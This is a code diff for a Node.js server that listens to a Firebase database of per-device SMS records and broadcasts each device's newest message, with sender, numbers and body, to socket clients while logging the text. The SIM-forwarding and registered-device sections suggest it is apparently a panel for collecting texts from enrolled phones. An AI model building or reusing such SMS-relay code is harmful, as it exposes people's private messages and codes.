@@ -682,82 +682,46 @@ simForwardRef.on("child_removed", (snap) =>
    ⭐ SMS LIVE — ONLY NEW / CHANGED SMS LOG
 ====================================================== */
 
-const smsNotificationsRef = rtdb.ref(SMS_NODE);
+const smsNotificationsRef = rtdb.ref("smsNotifications");
 
-function getLatestChange(prevObj, newObj) {
-  if (!prevObj) return Object.keys(newObj)[0]; // first time added
-
-  const prevKeys = new Set(Object.keys(prevObj));
-  const newKeys = Object.keys(newObj);
-
-  for (let k of newKeys) {
-    if (!prevKeys.has(k)) return k; // NEW SMS added
-    if (JSON.stringify(prevObj[k]) !== JSON.stringify(newObj[k])) return k; // Changed SMS
-  }
-
-  return null; // no change
-}
-
-const smsCache = {}; // cache per device
-
-async function handleSmsNotificationsBranch(snap, event = "update") {
+smsNotificationsRef.on("child_added", (snap) => {
   const uid = snap.key;
   const messages = snap.val() || {};
 
-  const prev = smsCache[uid] || null;
-  const changedMsgId = getLatestChange(prev, messages);
+  // 👇 Get last message ID
+  const keys = Object.keys(messages);
+  const lastMsgId = keys[keys.length - 1];
+  const sms = messages[lastMsgId];
 
-  smsCache[uid] = messages; // update cache
+  io.emit("smsLogsNew", {
+    success: true,
+    uniqueid: uid,
+    id: lastMsgId,
+    data: sms,
+    event: "added",
+  });
 
-  // Send PER-DEVICE LIST (still needed)
-  emitSmsDeviceLive(uid, messages, event);
-
-  // ⭐ Only send incremental update (NEW / CHANGED SMS)
-  if (changedMsgId) {
-    const sms = messages[changedMsgId];
-
-    console.log("\n\n======== 📩 NEW / CHANGED SMS ========");
-    console.log(`📌 DEVICE: ${uid}`);
-    console.log(`🆔 SMS-ID: ${changedMsgId}`);
-    console.log(`👤 Sender: ${sms.sender}`);
-    console.log(`📞 Sender Number: ${sms.senderNumber}`);
-    console.log(`📥 Receiver Number: ${sms.receiverNumber}`);
-    console.log(`🕒 Timestamp: ${sms.timestamp}`);
-    console.log(`✉️ Message: ${sms.body}`);
-    console.log("=======================================\n\n");
-
-    io.emit("smsLogsNew", {
-      success: true,
-      uniqueid: uid,
-      id: changedMsgId,
-      data: sms,
-      event,
-    });
-  }
-
-  // ⭐ Refresh ALL-SMS list (for messages.html)
-  await refreshSmsAllLive(`sms_${event}:${uid}`);
-}
-
-smsNotificationsRef.on("child_added", (snap) =>
-  handleSmsNotificationsBranch(snap, "added")
-);
-
-smsNotificationsRef.on("child_changed", (snap) =>
-  handleSmsNotificationsBranch(snap, "changed")
-);
-
-smsNotificationsRef.on("child_removed", async (snap) => {
-  const uid = snap.key;
-
-  console.log(`🗑 SMS branch removed for device ${uid}`);
-
-  smsCache[uid] = {};
-
-  emitSmsDeviceLive(uid, {}, "removed");
-  await refreshSmsAllLive(`sms_removed:${uid}`);
+  console.log("🔥 LIVE NEW SMS:", uid, sms.body);
 });
 
+smsNotificationsRef.on("child_changed", (snap) => {
+  const uid = snap.key;
+  const messages = snap.val() || {};
+
+  const keys = Object.keys(messages);
+  const lastMsgId = keys[keys.length - 1];
+  const sms = messages[lastMsgId];
+
+  io.emit("smsLogsNew", {
+    success: true,
+    uniqueid: uid,
+    id: lastMsgId,
+    data: sms,
+    event: "changed",
+  });
+
+  console.log("♻️ LIVE CHANGED SMS:", uid, sms.body);
+});
 /* ======================================================
       REGISTERED DEVICES LIVE REFRESH
 ====================================================== */
